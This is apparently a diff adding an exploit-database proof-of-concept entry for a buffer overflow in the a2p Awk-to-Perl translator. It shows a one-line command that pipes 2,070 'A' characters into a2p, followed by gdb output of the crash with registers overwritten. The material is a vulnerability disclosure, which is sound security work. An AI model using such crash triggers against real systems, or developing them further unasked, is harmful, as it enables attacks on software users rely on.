@@ -1,0 +1,37 @@
+# Exploit Title: Awk to Perl 1.007-5 - Buffer Overflow (PoC)
+# Author: Todor Donev
+# Date: 2018-07-11
+# Software: Linux Awk to Perl Translator '/usr/bin/a2p'
+# Version: 1.007-5
+# CVE: N/A
+# Tested on: CentOS 6.9, Ubuntu 10
+
+[todor@adamantium ~]$ python -c "print 'A' * 2070" | a2p > /dev/null
+Segmentation fault
+[todor@adamantium ~]$ gdb a2p --quiet
+Reading symbols from /usr/bin/a2p...(no debugging symbols found)...done.
+Missing separate debuginfos, use: debuginfo-install *SNIPED*
+(gdb) r bof
+Starting program: /usr/bin/a2p bof
+[Thread debugging using libthread_db enabled]
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0074ee65 in fgets () from /lib/libc.so.6
+(gdb) info reg
+eax            0x1060	4192
+ecx            0x1	1
+edx            0x41414141	1094795585
+ebx            0x880ff4	8916980
+esp            0xbffff0f0	0xbffff0f0
+ebp            0xbffff118	0xbffff118
+esi            0x41414141	1094795585
+edi            0x8062920	134621472
+eip            0x74ee65	0x74ee65 <fgets+53>
+eflags         0x210216	[ PF AF IF RF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb)
